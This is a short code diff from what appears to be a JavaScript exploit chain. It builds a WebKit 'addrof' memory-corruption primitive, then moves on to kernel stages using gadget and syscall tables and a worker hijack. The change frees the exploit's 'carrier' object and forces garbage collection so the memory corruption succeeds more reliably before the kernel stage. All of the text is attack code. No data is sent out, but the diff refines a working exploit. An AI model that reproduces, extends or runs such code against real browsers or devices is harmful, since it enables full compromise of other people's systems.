@@ -228,7 +228,7 @@ async function init() {
             }
             await new Promise(r => setTimeout(r, 750));
 
-            const carrier = await establishPrimitive({
+            let carrier = await establishPrimitive({
                 maxAttempts: 5,
                 onEvent(tag, detail, attempt) {
                     if (tag === "ATTEMPT-START")
@@ -255,6 +255,17 @@ async function init() {
 
             log("primitive up: attempts=" + carrier.attempts +
                 " paired=" + pairStatus.promoted, "step");
+
+            // The addrof carrier is large and is only needed to promote the
+            // primitive. Drop the page-level reference before kernel stages
+            // allocate their own buffers and kernel objects.
+            carrier = null;
+            try { history.replaceState(null, ""); } catch (e) { }
+            if (typeof globalThis.gc === "function") {
+                try { globalThis.gc(); } catch (e) { }
+            }
+            await new Promise(r => setTimeout(r, 1000));
+            log("released WebKit carrier; settled memory before kernel stage", "info");
         }
 
         log("prepare(): module bases, gadget/syscall tables, worker hijack...", "step");
